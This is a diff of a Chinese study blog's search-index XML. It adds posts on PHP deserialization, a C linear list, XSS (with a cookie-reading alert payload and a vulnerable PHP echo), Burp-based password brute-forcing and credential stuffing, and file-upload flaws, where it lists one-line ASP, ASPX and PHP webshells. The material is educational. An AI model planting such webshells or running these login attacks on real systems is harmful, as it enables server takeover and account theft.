@@ -19,70 +19,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>PHP反序列化</title>
-    <url>/posts/2328281505.html</url>
-    <content><![CDATA[<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><ul>
-<li>PHP序列化给我们传递对象提供了-种简单的方法。将一个复杂的数据类型转换为字符串(序列化)存储在本地。在用到的时候能很方便地将硬盘上的字符串数据转换回原始的数据类型(反序列化)。</li>
-</ul>
-<p>序列化的函数为serialize (编码)  </p>
-<p>反序列化的函数为unserialize (解码)  </p>
-<p>序列化和反序列化的目的是使得程序间传输对象会更加方便。  </p>
-<p>当serialize序列化对象时，PHP将试图在序列动作之前调用该对象的成员函数__sleep0, 这样就允许对象在被序列化之前做任何清除操作。  </p>
-<p>类似的，当使用unserialize(恢复对象时，将调用__wakeup( 成员函数。这也是PHP反序列化经典的考点，CTF比赛中很多都是围绕着PHP反序列化对象的特性来突然getshell的，所以学习反序列化前得掌握「PHP基础的类与对象」。  </p>
-<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul>
-<li><a href="https://www.sqlsec.com/2020/09/xdebug.html">https://www.sqlsec.com/2020/09/xdebug.html</a><br>记得改端口，将端口改为9000<br>调试：首先设置断点，开始调试，</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>网络安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>线性表</title>
-    <url>/posts/1089618801.html</url>
-    <content><![CDATA[<h1 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h1><h2 id="一个线性表是n个数据元素的有限序列"><a href="#一个线性表是n个数据元素的有限序列" class="headerlink" title="一个线性表是n个数据元素的有限序列"></a>一个线性表是n个数据元素的有限序列</h2><h2 id="概念：用一组地址连续的存储单元依次存储线性表的数据元素，这种存储结构的线性表称为顺序表。"><a href="#概念：用一组地址连续的存储单元依次存储线性表的数据元素，这种存储结构的线性表称为顺序表。" class="headerlink" title="概念：用一组地址连续的存储单元依次存储线性表的数据元素，这种存储结构的线性表称为顺序表。"></a>概念：用一组地址连续的存储单元依次存储线性表的数据元素，这种存储结构的线性表称为顺序表。</h2><h2 id="特点：逻辑上相邻的数据元素，物理次序也是相邻的。"><a href="#特点：逻辑上相邻的数据元素，物理次序也是相邻的。" class="headerlink" title="特点：逻辑上相邻的数据元素，物理次序也是相邻的。"></a>特点：逻辑上相邻的数据元素，物理次序也是相邻的。</h2><ul>
-<li>只要确定好了存储线性表的起始位置，线性表中任一数据元素都可以随机存取，所以线性表的顺序存储结构是一种随机存取的储存结构，因为高级语言中的数组类型也是有随机存取的特性，所以通常我们都使用数组来描述数据结构中的顺序储存结构，用动态分配的一维数组表示线性表。</li>
-</ul>
-<h3 id="顺序表存储结构"><a href="#顺序表存储结构" class="headerlink" title="顺序表存储结构"></a>顺序表存储结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//头文件</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define LIST_INIT_SIZE 100  //线性表存储空间的初始分配量</span><br><span class="line">#define LISTINCREMENT 10   //线性表存储空间的分配量</span><br><span class="line">#define OK 1    //成功标识</span><br><span class="line">#define ERROR 0 //失败标识</span><br><span class="line"></span><br><span class="line">typedef int Status;	//Status是函数的类型，其值是函数结果状态代码，如OK等</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef int ElemType;   //ElemType的类型根据实际情况而定，这里假定为int</span><br><span class="line">//顺序表数据结构</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    ElemType *elem;  //存储空间基址</span><br><span class="line">    int length;  //当前长度</span><br><span class="line">    int listsize; //当前分配的存储容量</span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure>
-<h3 id="1、构建一个空的顺序表L"><a href="#1、构建一个空的顺序表L" class="headerlink" title="1、构建一个空的顺序表L"></a>1、构建一个空的顺序表L</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Status InitList(SqList &amp;L)&#123;</span><br><span class="line">    //构造一个空的线性表L</span><br><span class="line">    L.elem = (ElemType *)malloc(MAXSIZE*sizeof(ElemType));</span><br><span class="line">    if(!L.elem)exit(OVERFLOW);                   //存储分配失败</span><br><span class="line">    L.length = 0;                                //空表长度为0</span><br><span class="line">    L.listsize = LIST_INIT_SIZE;                 //初始存储容量</span><br><span class="line">    return OK;</span><br><span class="line">&#125;// InitList.Sq</span><br></pre></td></tr></table></figure>
-<h3 id="2、顺序表的插入"><a href="#2、顺序表的插入" class="headerlink" title="2、顺序表的插入"></a>2、顺序表的插入</h3><ul>
-<li>一般情况下，在第i(1≤i≤n)个元素之前插入一个元素时，需要将第n至第i个元素向后移动一个位置<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Status ListInsert_Sq(SqList &amp;L, int i, ElemType e)&#123;</span><br><span class="line">    //在顺序线性表L中第i个元素之前插入新的元素e</span><br><span class="line">    //i的合法值为1≤i≤Listlength_Sq(L)+1</span><br><span class="line">    if(i&lt;1||i&gt;L.length+1) return ERROR;   //i值不合法</span><br><span class="line">    if (L.length &gt;= L.listsize)&#123;  //线性表已满,增加分配</span><br><span class="line">        newbase=(ElemType *)realloc(L.elem</span><br><span class="line">                    (L.listsize+LISTINCREMENT)*sizeof(ElemType));</span><br><span class="line">        if(!newbase)exit(OVERFLOW);  //存储分配失败</span><br><span class="line">        L.elem=newbase;              //新基址</span><br><span class="line">        L.listsize+=LISTINCREMENT;   //增加存储容量</span><br><span class="line">    &#125;   </span><br><span class="line">    q=&amp;(L.elem[i-1]);       //q为插入位置</span><br><span class="line">    for(p=&amp;(L.elem[L.length-1]);p&gt;=q;--p) * (p+1)=*p;</span><br><span class="line">                            //插入位置及元素后移</span><br><span class="line">    *q  = e;   //将新元素插入</span><br><span class="line">    ++L.length;    //长度加1</span><br><span class="line">    return OK;</span><br><span class="line">&#125;// ListInsert_Sq</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="3、顺序表的删除"><a href="#3、顺序表的删除" class="headerlink" title="3、顺序表的删除"></a>3、顺序表的删除</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Status ListDelete_Sq(SqList &amp;L,int i,ElemType &amp;e)&#123;</span><br><span class="line">    //在顺序表L中删除第i个元素，并用e返回其值</span><br><span class="line">    //i的合法值为1≤i≤Listlength_Sq(L)</span><br><span class="line">    if(i &lt; 1 || i &gt; L.length) return ERROR;     //i值不合法</span><br><span class="line">    p=&amp;(L.elem[i-1]);                           //p为被删除的位置</span><br><span class="line">    e=*p;                                       //被删除的元素值赋给e</span><br><span class="line">    q=L.elem+L.length-1;                        //表位元素的位置</span><br><span class="line">    for(++p;p&lt;=q;++p)*(p-1)=*p;                 //被删除元素之后的元素左移</span><br><span class="line">    --L.length;                  //表长-1</span><br><span class="line">    return OK;</span><br><span class="line">&#125;ListDelete_Sq</span><br></pre></td></tr></table></figure>
-<h2 id="顺序表的时间复杂度"><a href="#顺序表的时间复杂度" class="headerlink" title="顺序表的时间复杂度"></a>顺序表的时间复杂度</h2><ul>
-<li>线性表的顺序存储结果在读存数据时的时间复杂度为O(1),插入、删除操作的时间复杂度为O(n)</li>
-</ul>
-<h2 id="顺序表的优缺点"><a href="#顺序表的优缺点" class="headerlink" title="顺序表的优缺点"></a>顺序表的优缺点</h2><ul>
-<li>优点：无须为表中元素之间的逻辑关系而增加额外的存储空间；可以快速的存取表中任一位置的元素。<br>缺点：插入和删除操作需要移动大量元素；当线性表长度较大时，难以确定存储空间的容量；造成存储空间的“碎片”。</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS</title>
-    <url>/posts/3909557445.html</url>
-    <content><![CDATA[<h3 id="针对HTML的注入"><a href="#针对HTML的注入" class="headerlink" title="针对HTML的注入"></a>针对HTML的注入</h3><h2 id="XSS简介："><a href="#XSS简介：" class="headerlink" title="XSS简介："></a>XSS简介：</h2><ul>
-<li>XSS全称叫做跨站脚本（Cross-Site Scripting）攻击，是一种代码注入攻击，往网页中插入恶意的JS脚本<br>比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射性XSS（非持久型）"><a href="#反射性XSS（非持久型）" class="headerlink" title="反射性XSS（非持久型）"></a>反射性XSS（非持久型）</h3><ul>
-<li>反射性跨站脚本也称非持久型，参数行跨站脚本。反射性XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说黑客往往需要诱使用户“点击”一个恶意软件，才能攻击成功。<br>假设一个页面把用户输入的参数直接输出到页面上：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = $_GET[&#x27;param&#x27;];</span><br><span class="line">echo &quot;&lt;h1&gt;&quot;.$input.&quot;&lt;/h1&gt;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-用户向param提交的数据会在<h1>的标签中展示出来<br><img src="/posts/3909557445/1.png"></h1></li>
-</ul>
-<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><ul>
-<li>存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存、还是文件系统等），下次请求目标页面时，不用再提交XSS代码。<br>最典型的例子是留言板XSS<br>存储型XSS的攻击是最隐蔽的也是为还比较大的，普通用户看到的代码是正常的，担当用户查看留言版的时候，那些流言会从数据库中查询出来并显示，浏览器发现有XSS代码，就当作正常的HTML与JS解析执行，于是就出发了XSS攻击。</li>
-</ul>
-<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><ul>
-<li>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。他和反射型XSS和存储型XSS的差别在于DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器的DOM解析，可以认为完全就是客户端的事。<br><img src="/posts/3909557445/2.png"></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>网络安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hexo修改主题</title>
     <url>/posts/38893.html</url>
     <content><![CDATA[<ul>
@@ -119,6 +55,70 @@
 ]]></content>
       <tags>
         <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP反序列化</title>
+    <url>/posts/2328281505.html</url>
+    <content><![CDATA[<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><ul>
+<li>PHP序列化给我们传递对象提供了-种简单的方法。将一个复杂的数据类型转换为字符串(序列化)存储在本地。在用到的时候能很方便地将硬盘上的字符串数据转换回原始的数据类型(反序列化)。</li>
+</ul>
+<p>序列化的函数为serialize (编码)  </p>
+<p>反序列化的函数为unserialize (解码)  </p>
+<p>序列化和反序列化的目的是使得程序间传输对象会更加方便。  </p>
+<p>当serialize序列化对象时，PHP将试图在序列动作之前调用该对象的成员函数__sleep0, 这样就允许对象在被序列化之前做任何清除操作。  </p>
+<p>类似的，当使用unserialize(恢复对象时，将调用__wakeup( 成员函数。这也是PHP反序列化经典的考点，CTF比赛中很多都是围绕着PHP反序列化对象的特性来突然getshell的，所以学习反序列化前得掌握「PHP基础的类与对象」。  </p>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul>
+<li><a href="https://www.sqlsec.com/2020/09/xdebug.html">https://www.sqlsec.com/2020/09/xdebug.html</a><br>记得改端口，将端口改为9000<br>调试：首先设置断点，开始调试，</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>线性表</title>
+    <url>/posts/1089618801.html</url>
+    <content><![CDATA[<h1 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h1><h2 id="一个线性表是n个数据元素的有限序列"><a href="#一个线性表是n个数据元素的有限序列" class="headerlink" title="一个线性表是n个数据元素的有限序列"></a>一个线性表是n个数据元素的有限序列</h2><h2 id="概念：用一组地址连续的存储单元依次存储线性表的数据元素，这种存储结构的线性表称为顺序表。"><a href="#概念：用一组地址连续的存储单元依次存储线性表的数据元素，这种存储结构的线性表称为顺序表。" class="headerlink" title="概念：用一组地址连续的存储单元依次存储线性表的数据元素，这种存储结构的线性表称为顺序表。"></a>概念：用一组地址连续的存储单元依次存储线性表的数据元素，这种存储结构的线性表称为顺序表。</h2><h2 id="特点：逻辑上相邻的数据元素，物理次序也是相邻的。"><a href="#特点：逻辑上相邻的数据元素，物理次序也是相邻的。" class="headerlink" title="特点：逻辑上相邻的数据元素，物理次序也是相邻的。"></a>特点：逻辑上相邻的数据元素，物理次序也是相邻的。</h2><ul>
+<li>只要确定好了存储线性表的起始位置，线性表中任一数据元素都可以随机存取，所以线性表的顺序存储结构是一种随机存取的储存结构，因为高级语言中的数组类型也是有随机存取的特性，所以通常我们都使用数组来描述数据结构中的顺序储存结构，用动态分配的一维数组表示线性表。</li>
+</ul>
+<h3 id="顺序表存储结构"><a href="#顺序表存储结构" class="headerlink" title="顺序表存储结构"></a>顺序表存储结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIST_INIT_SIZE 100  <span class="comment">//线性表存储空间的初始分配量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LISTINCREMENT 10   <span class="comment">//线性表存储空间的分配量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1    <span class="comment">//成功标识</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR 0 <span class="comment">//失败标识</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Status;	<span class="comment">//Status是函数的类型，其值是函数结果状态代码，如OK等</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;   <span class="comment">//ElemType的类型根据实际情况而定，这里假定为int</span></span><br><span class="line"><span class="comment">//顺序表数据结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType *elem;  <span class="comment">//存储空间基址</span></span><br><span class="line">    <span class="type">int</span> length;  <span class="comment">//当前长度</span></span><br><span class="line">    <span class="type">int</span> listsize; <span class="comment">//当前分配的存储容量</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure>
+<h3 id="1、构建一个空的顺序表L"><a href="#1、构建一个空的顺序表L" class="headerlink" title="1、构建一个空的顺序表L"></a>1、构建一个空的顺序表L</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Status <span class="title function_">InitList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">    <span class="comment">//构造一个空的线性表L</span></span><br><span class="line">    L.elem = (ElemType *)<span class="built_in">malloc</span>(MAXSIZE*<span class="keyword">sizeof</span>(ElemType));</span><br><span class="line">    <span class="keyword">if</span>(!L.elem)<span class="built_in">exit</span>(OVERFLOW);                   <span class="comment">//存储分配失败</span></span><br><span class="line">    L.length = <span class="number">0</span>;                                <span class="comment">//空表长度为0</span></span><br><span class="line">    L.listsize = LIST_INIT_SIZE;                 <span class="comment">//初始存储容量</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;<span class="comment">// InitList.Sq</span></span><br></pre></td></tr></table></figure>
+<h3 id="2、顺序表的插入"><a href="#2、顺序表的插入" class="headerlink" title="2、顺序表的插入"></a>2、顺序表的插入</h3><ul>
+<li>一般情况下，在第i(1≤i≤n)个元素之前插入一个元素时，需要将第n至第i个元素向后移动一个位置<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Status <span class="title function_">ListInsert_Sq</span><span class="params">(SqList &amp;L, <span class="type">int</span> i, ElemType e)</span>&#123;</span><br><span class="line">    <span class="comment">//在顺序线性表L中第i个元素之前插入新的元素e</span></span><br><span class="line">    <span class="comment">//i的合法值为1≤i≤Listlength_Sq(L)+1</span></span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>) <span class="keyword">return</span> ERROR;   <span class="comment">//i值不合法</span></span><br><span class="line">    <span class="keyword">if</span> (L.length &gt;= L.listsize)&#123;  <span class="comment">//线性表已满,增加分配</span></span><br><span class="line">        newbase=(ElemType *)<span class="built_in">realloc</span>(L.elem</span><br><span class="line">                    (L.listsize+LISTINCREMENT)*<span class="keyword">sizeof</span>(ElemType));</span><br><span class="line">        <span class="keyword">if</span>(!newbase)<span class="built_in">exit</span>(OVERFLOW);  <span class="comment">//存储分配失败</span></span><br><span class="line">        L.elem=newbase;              <span class="comment">//新基址</span></span><br><span class="line">        L.listsize+=LISTINCREMENT;   <span class="comment">//增加存储容量</span></span><br><span class="line">    &#125;   </span><br><span class="line">    q=&amp;(L.elem[i<span class="number">-1</span>]);       <span class="comment">//q为插入位置</span></span><br><span class="line">    <span class="keyword">for</span>(p=&amp;(L.elem[L.length<span class="number">-1</span>]);p&gt;=q;--p) * (p+<span class="number">1</span>)=*p;</span><br><span class="line">                            <span class="comment">//插入位置及元素后移</span></span><br><span class="line">    *q  = e;   <span class="comment">//将新元素插入</span></span><br><span class="line">    ++L.length;    <span class="comment">//长度加1</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;<span class="comment">// ListInsert_Sq</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="3、顺序表的删除"><a href="#3、顺序表的删除" class="headerlink" title="3、顺序表的删除"></a>3、顺序表的删除</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Status <span class="title function_">ListDelete_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,ElemType &amp;e)</span>&#123;</span><br><span class="line">    <span class="comment">//在顺序表L中删除第i个元素，并用e返回其值</span></span><br><span class="line">    <span class="comment">//i的合法值为1≤i≤Listlength_Sq(L)</span></span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">1</span> || i &gt; L.length) <span class="keyword">return</span> ERROR;     <span class="comment">//i值不合法</span></span><br><span class="line">    p=&amp;(L.elem[i<span class="number">-1</span>]);                           <span class="comment">//p为被删除的位置</span></span><br><span class="line">    e=*p;                                       <span class="comment">//被删除的元素值赋给e</span></span><br><span class="line">    q=L.elem+L.length<span class="number">-1</span>;                        <span class="comment">//表位元素的位置</span></span><br><span class="line">    <span class="keyword">for</span>(++p;p&lt;=q;++p)*(p<span class="number">-1</span>)=*p;                 <span class="comment">//被删除元素之后的元素左移</span></span><br><span class="line">    --L.length;                  <span class="comment">//表长-1</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;ListDelete_Sq</span><br></pre></td></tr></table></figure>
+<h2 id="顺序表的时间复杂度"><a href="#顺序表的时间复杂度" class="headerlink" title="顺序表的时间复杂度"></a>顺序表的时间复杂度</h2><ul>
+<li>线性表的顺序存储结果在读存数据时的时间复杂度为O(1),插入、删除操作的时间复杂度为O(n)</li>
+</ul>
+<h2 id="顺序表的优缺点"><a href="#顺序表的优缺点" class="headerlink" title="顺序表的优缺点"></a>顺序表的优缺点</h2><ul>
+<li>优点：无须为表中元素之间的逻辑关系而增加额外的存储空间；可以快速的存取表中任一位置的元素。<br>缺点：插入和删除操作需要移动大量元素；当线性表长度较大时，难以确定存储空间的容量；造成存储空间的“碎片”。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS</title>
+    <url>/posts/3909557445.html</url>
+    <content><![CDATA[<h3 id="针对HTML的注入"><a href="#针对HTML的注入" class="headerlink" title="针对HTML的注入"></a>针对HTML的注入</h3><h2 id="XSS简介："><a href="#XSS简介：" class="headerlink" title="XSS简介："></a>XSS简介：</h2><ul>
+<li>XSS全称叫做跨站脚本（Cross-Site Scripting）攻击，是一种代码注入攻击，往网页中插入恶意的JS脚本<br>比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射性XSS（非持久型）"><a href="#反射性XSS（非持久型）" class="headerlink" title="反射性XSS（非持久型）"></a>反射性XSS（非持久型）</h3><ul>
+<li>反射性跨站脚本也称非持久型，参数行跨站脚本。反射性XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说黑客往往需要诱使用户“点击”一个恶意软件，才能攻击成功。<br>假设一个页面把用户输入的参数直接输出到页面上：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = $_GET[&#x27;param&#x27;];</span><br><span class="line">echo &quot;&lt;h1&gt;&quot;.$input.&quot;&lt;/h1&gt;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+用户向param提交的数据会在<h1>的标签中展示出来<br><img src="/posts/3909557445/1.png"></h1></li>
+</ul>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><ul>
+<li>存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存、还是文件系统等），下次请求目标页面时，不用再提交XSS代码。<br>最典型的例子是留言板XSS<br>存储型XSS的攻击是最隐蔽的也是为还比较大的，普通用户看到的代码是正常的，担当用户查看留言版的时候，那些流言会从数据库中查询出来并显示，浏览器发现有XSS代码，就当作正常的HTML与JS解析执行，于是就出发了XSS攻击。</li>
+</ul>
+<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><ul>
+<li>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。他和反射型XSS和存储型XSS的差别在于DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器的DOM解析，可以认为完全就是客户端的事。<br><img src="/posts/3909557445/2.png"></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
       </tags>
   </entry>
   <entry>
@@ -174,6 +174,91 @@
 <li>指定文件的MD5值校验</li>
 </ul>
 ]]></content>
+      <tags>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>密码爆破</title>
+    <url>/posts/29527.html</url>
+    <content><![CDATA[<h2 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h2><h3 id="四位数字爆破。"><a href="#四位数字爆破。" class="headerlink" title="四位数字爆破。"></a>四位数字爆破。</h3><ul>
+<li>抓包添加payload，设置密码模块为数字即可，范围0000-9999<br>数字格式：<br>基地：Decimal<br>整数部分的最小位数：4<br>少数民族最小位数：0<br>少数最大字数：0<br>通过长度判断正确包</li>
+</ul>
+<h3 id="简单的脱弱口令爆破："><a href="#简单的脱弱口令爆破：" class="headerlink" title="简单的脱弱口令爆破："></a>简单的脱弱口令爆破：</h3><p>找一个好用的字典，设置爆破参数和类型，加载字典。通过返回包长度判断。</p>
+<h3 id="带验证码爆破？"><a href="#带验证码爆破？" class="headerlink" title="带验证码爆破？"></a>带验证码爆破？</h3><p>注意：不要放包，只要一直不放包，验证码就不会失效，否则，验证码改变会导致爆破不成功。 （验证码复用）其余一样。</p>
+<h3 id="Basic认证爆破"><a href="#Basic认证爆破" class="headerlink" title="Basic认证爆破"></a>Basic认证爆破</h3><ul>
+<li>打开发现是一个类似于basic认证的框，输入数据抓包。<br>发现是base64加密字段，推测basic字段是 用户名：密码 这种格式的base64加密形式。在xintruder中添加basic的加密字段，payload1选择自定义迭代器（Custom itermtor）。<br>然后设置定位分隔符和用户名，在位置2添加密码即可<br>然后在有效荷载里面添加base64编码模块<br>因为base64会自动编码特殊字符，需要取消后面的payload url自动编码</li>
+</ul>
+<h3 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h3><ul>
+<li>随便输入密码，发现密码是一串MD5值，解密发现是输入的密码，猜测是前端加密，同样的发送到intruder模块进行设置。<br>在payload的编码设置添加hash的md5加密模块</li>
+</ul>
+<h3 id="泄露数据撞库"><a href="#泄露数据撞库" class="headerlink" title="泄露数据撞库"></a>泄露数据撞库</h3><p><img src="/posts/29527/First.png" alt="例题"></p>
+<ul>
+<li>bp抓包，清掉所有变量，标记密码用户名，选择音叉攻击（一一对应的攻击），导入密码用户名开始攻击。通过返回长度找到正确的账号密码。<br><img src="/posts/29527/Second.png"></li>
+</ul>
+<h3 id="返回包特征提取爆破"><a href="#返回包特征提取爆破" class="headerlink" title="返回包特征提取爆破"></a>返回包特征提取爆破</h3><p><img src="/posts/29527/3.png"><br>若登陆成功和登陆失败返回的长度一样，则在options添加选项中，从返回包中获取返回的字段，可以直接在返回包中看到结果  </p>
+<h3 id="数据包传输类型"><a href="#数据包传输类型" class="headerlink" title="数据包传输类型"></a>数据包传输类型</h3><ul>
+<li>application….from urlLencode</li>
+<li>payload打开密码字典以换行为分割</li>
+<li>批量请求，寻找flag</li>
+</ul>
+<h3 id="简单的token验证"><a href="#简单的token验证" class="headerlink" title="简单的token验证"></a>简单的token验证</h3><ul>
+<li>token时间戳验证</li>
+</ul>
+<h3 id="识别验证码爆破"><a href="#识别验证码爆破" class="headerlink" title="识别验证码爆破"></a>识别验证码爆破</h3><p><img src="/posts/29527/4.png"></p>
+<ul>
+<li>工具：PKAV HTTP Fuzzer</li>
+<li>验证码识别重放模式为单线程</li>
+<li>这次比之前增加了验证码验证模块，码源提示ocr，容易想到利用burp的插件来进行验证码识别爆破。<br>这里用的是captcha-killer插件，开源地址：<a href="http://github.com/c0ny1/captcha-killer">http://github.com/c0ny1/captcha-killer</a><br>先利用burp抓取生成验证码页面，发送到插件的验证码识别模块。</li>
+</ul>
+<h2 id="防止爆破的方法"><a href="#防止爆破的方法" class="headerlink" title="防止爆破的方法"></a>防止爆破的方法</h2><ul>
+<li>多因素认证，爆破次数太多会锁定，但漏洞会导致管理也无法登录。</li>
+<li>sso————统一登陆认证</li>
+<li>加密</li>
+<li>token</li>
+<li>验证码</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传</title>
+    <url>/posts/2682.html</url>
+    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul>
+<li>简介：现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。  </li>
+<li>漏洞产生原因：<br>上传文件时，如果服务器端没有对客户端上传的文件进行严格的检验或过滤，就容易造成可上传任意文件的情况，包括上传脚本文件（asp，aspx，php，jsp）  </li>
+<li>漏洞的危害：<br>非法用户可以利用上传的脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</li>
+<li>ASP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;x&quot;</span>)%&gt;//密码是‘x’</span><br><span class="line">&lt;%execute request(<span class="string">&quot;x&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>ASPX  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;x&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>PHP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])?&gt;  //比较标准的用法；不一定是post，也可以是get</span><br><span class="line">&lt;?php assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];?)&gt;  //php版本&gt;7时不能用了</span><br></pre></td></tr></table></figure></li>
